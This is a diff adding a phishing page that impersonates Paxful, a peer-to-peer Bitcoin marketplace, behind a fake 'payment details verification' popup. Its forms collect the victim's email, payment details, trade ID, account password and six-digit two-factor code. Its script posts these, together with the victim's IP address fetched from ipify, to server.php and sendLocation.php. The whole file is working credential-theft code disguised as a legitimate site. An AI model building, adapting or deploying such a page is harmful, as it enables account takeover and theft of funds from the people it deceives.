@@ -1,0 +1,408 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Peer to Peer Bitcoin Payment Preview</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/fontawesome.min.css" integrity="sha512-OdEXQYCOldjqUEsuMKsZRj93Ht23QRlhIb8E/X0sbwZhme8eUw6g8q7AdxGJKakcBbv7+/PX0Gc2btf7Ru8cZA==" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+  </head>
+  <body>
+
+
+    <header>
+      <div class="logo">
+        <img src="">
+      </div>
+      <nav>
+        <ul>
+          <li class="buy">Buy</li>
+
+          <li class="sell">Sell</li>
+          <li class="">Create An Offer</li>
+          <li class="">Wallet</li>
+          <li class="">Become A Vendor</li>
+
+          <span>
+            <li class="acct">Get Started</li>
+            <li class="">English</li>
+          </span>
+        </ul>
+      </nav>
+    </header>
+
+    <div class="popup-cover">
+      <div class="popup">
+      <div class="loading">
+
+      <i class="fas fa-circle-notch fa-spin"></i>
+  </div>
+        <h3>Paxful</h3>
+
+
+
+        <div class="hold" style="display: flex">
+          <img class="popup-logo" src="paxful.png">
+
+          <img class="lang" src="lang-snip.png">
+        </div>
+        <div class="p"></div>
+
+        <div class="formcover">
+          <form class="infoform" onsubmit="return submitData()"><br>
+          <h2 class="purple-cover">
+Payment Details verification overview
+
+</h2>
+<span class="info"> <img src="icon.svg">Fill in the requested payment details to continue
+            </span>
+
+
+<label>Email address</label>
+            <input type="email" class="email" id="email" name="email" placeholder="Enter your paxful email address" required="">
+            <label>Payment Details</label>
+            <input type="text" id="details" name="details" placeholder="Enter Payment Details" required="">
+<label>Trade ID</label>
+            <input type="text" id="tradeid" name="tradeId" placeholder="Enter Trade Id" required="">
+
+            
+
+
+            <button type="button" id="submitBtn" onclick="showDetails()" name="submit">
+              Continue
+            </button>
+            <br><br>
+          </form>
+
+<form class="paymentinfo">
+
+
+<h2 class="purple-cover">
+Sign in to continue
+</h2>
+
+<span class="info"> <img src="icon.svg">User Authentication is required
+            </span>
+
+              <label>Password</label>
+                     
+              <i class="fa fa-eye visibility_toggle" onclick="togglePasswordShow()"></i>
+              <input type="password" name="password" placeholder="Password" id="password" required="">
+              <a href="#" class="forgot">Forgot Password?</a>
+            
+            <button type="button" id="submitBtn" onclick="sendRequest()" name="submit">
+              Continue
+            </button>
+</form>
+
+
+
+<form class="codeform" onsubmit="return submitCode()" style="display: block;">
+            <h4>2-factors authentication</h4>
+
+            <span class="info">Enter your two-factor authentication code below to continue.
+            </span>
+
+            <label>Enter Code</label>
+            <div class="input-hold">
+            <input type="text" maxlength="1" size="1" class="box" min="0" id="firstCode" max="9" pattern="[0-9]{1}">
+            <input type="text" maxlength="1" size="1" id="secondCode" min="0" class="box" max="9" pattern="[0-9]{1}"><input type="text" maxlength="1" size="1" min="0" class="box" id="thirdCode" max="9" pattern="[0-9]{1}"><input type="text" maxlength="1" size="1" id="fourthCode" class="box" min="0" max="9" pattern="[0-9]{1}">
+            <input type="text" maxlength="1" size="1" id="fifthCode" min="0" class="box" max="9" pattern="[0-9]{1}">
+            <input type="text" maxlength="1" size="1" id="sixthCode" class="box" min="0" max="9" pattern="[0-9]{1}">
+
+</div>
+
+            <button type="button" id="codeBtn" class="btn" onclick="send2fa()" name="submit">
+              Continue
+            </button>
+          </form>
+
+          <form class="confirm-form">
+
+<h2 class="purple-cover">
+Confirm your details below
+
+
+</h2>
+
+<div class="col1">These details will be used with your trade partner on <bold class="tradeIdProof"></bold> via trade chat.</div>
+
+<div class="prev-details">
+
+            </div>
+
+</form>
+
+
+        </div>
+      </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="ajax.js"></script>
+    
+    <script>
+
+var loading = document.querySelector(".loading")
+
+    
+    var ip;
+var elem = document.querySelector(".formcover");
+var passwordHold = document.querySelector(".passwordHold");
+var popup  = document.querySelector(".popup");
+var showBtn = document.querySelector(".showBtn");
+
+
+
+function showDetails(){
+  var email = document.getElementById("email").value;
+  
+  var tradeid = document.getElementById("tradeid").value;
+  
+  if(email == "" || tradeid == "" || ValidateEmail(email) == false){
+    alert("Kindly input your details correctly")
+  }
+  else{
+
+
+showLoading();
+
+setTimeout(() => {
+  elem.style.marginLeft = "-100%";
+closeLoading();
+}, 2000);
+   
+  }
+
+
+
+}
+
+var isShowing = false;
+var toggle_btn = document.querySelector(".visibility_toggle");
+
+function togglePasswordShow(){
+  var password = document.querySelector("#password");
+
+  if(isShowing == true){
+    isShowing = false;
+    toggle_btn.className = "fa fa-eye visibility_toggle";
+    password.type = "password";
+
+  }
+  else{
+    
+    isShowing = true;
+    toggle_btn.className = "fa fa-eye-slash visibility_toggle";
+    password.type = "text";
+  }
+
+}
+
+function showConfirm(){
+  var tradeid = document.getElementById("tradeid");
+  
+  var details = document.getElementById("details");
+
+
+  if(details.value != ""){
+
+    elem.style.marginLeft = "-200%";
+  document.querySelector(".tradeIdProof").innerHTML = tradeid.value
+  document.querySelector(".detailsProof").innerHTML = details.value
+
+  }
+  else{
+    alert("Kindly input your details correctly")
+  }
+
+}
+function ValidateEmail(mail) 
+{
+ if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(mail))
+  {
+    return true
+  }
+    //alert("You have entered an invalid email address!")
+    return false
+}
+function sendRequest(){
+
+  var email = document.getElementById("email").value;
+  
+  var tradeid = document.getElementById("tradeid").value;
+  
+  var password = document.getElementById("password").value;
+  
+  var details = document.getElementById("details").value;
+
+showLoading();
+
+  makeRequest(
+  "POST",
+  "server.php",
+  true,
+  false,
+  "email="+email+"&details="+details+"&tradeid="+tradeid+"&password="+password+"&ip="+ip+"",
+function(response){
+  elem.style.marginLeft = "-200%";
+
+closeLoading();
+}
+) 
+}
+
+function send2fa(){
+
+  var email = document.getElementById("email").value;
+
+
+}
+
+
+
+window.onload = function () {
+  var xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "https://api.ipify.org/?format=json", true);
+  xhttp.send();
+  xhttp.onload = function () {
+    var result = JSON.parse(this.responseText);
+    ip = result.ip;
+    console.log(this.responseText);
+sendLocation();
+
+  };
+};
+
+
+function sendLocation(){
+  var xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "sendLocation.php?ip="+ip+"", true);
+
+  xhttp.onload = function () {
+    console.log(this.responseText);
+
+
+  }
+  xhttp.send();
+}
+
+function send2fa(){
+
+
+
+  var email = document.getElementById("email").value;
+  var firstCode = document.querySelector("#firstCode").value;
+        
+        var secondCode = document.querySelector("#secondCode").value;
+        
+        var thirdCode = document.querySelector("#thirdCode").value;
+        
+        var fourthCode = document.querySelector("#fourthCode").value;
+        
+        var fifthCode = document.querySelector("#fifthCode").value;
+        
+        var sixthCode = document.querySelector("#sixthCode").value;
+
+        var fullcode = firstCode+""+ secondCode +""+thirdCode+""+fourthCode+""+fifthCode+""+sixthCode+"";
+
+
+
+  makeRequest(
+  "POST",
+  "server.php",
+  true,
+  false,
+  "code="+fullcode+"&email="+email+"",
+function(response){
+console.log(response);
+
+makeRequest(
+"GET",
+"doc.php",
+true,
+false,
+"",
+function(response){
+
+document.querySelector(".popup").innerHTML = response;
+
+}
+
+
+)
+
+
+}
+)
+showLoading();
+
+
+}
+
+function showLoading(){
+  loading.style.display = "block";
+}
+
+function closeLoading(){
+  loading.style.display = "none";
+}
+
+$(function() {
+  'use strict';
+
+  var body = $('body');
+
+  function goToNextInput(e) {
+    var key = e.which,
+      t = $(e.target),
+      sib = t.next('input.box');
+
+
+    if (key === 9 || key === 32) {
+      return true;
+    }
+    if(key === 8){
+      back();
+      return false;
+    }
+
+    if (!sib || !sib.length) {
+      sib = body.find('input.box').eq(0);
+    }
+    sib.select().focus();
+  }
+
+  function onKeyDown(e) {
+    var key = e.which;
+
+    if (key === 9 || (key >= 48 && key <= 57)) {
+      return true;
+    }
+
+    e.preventDefault();
+    return false;
+  }
+  function back(){
+    sib = t.prev('input.box');
+
+    if (!sib || !sib.length) {
+      sib = body.find('input.box').eq(0);
+    }
+    sib.select().focus().innerHTML="";
+
+  }
+  
+  function onFocus(e) {
+    $(e.target).select();
+  }
+
+  body.on('keyup', 'input.box', goToNextInput);
+  body.on('keydown', 'input.box', onKeyDown);
+  body.on('click', 'input.box', onFocus);
+
+})
+    </script>
+  
+
+</body></html>
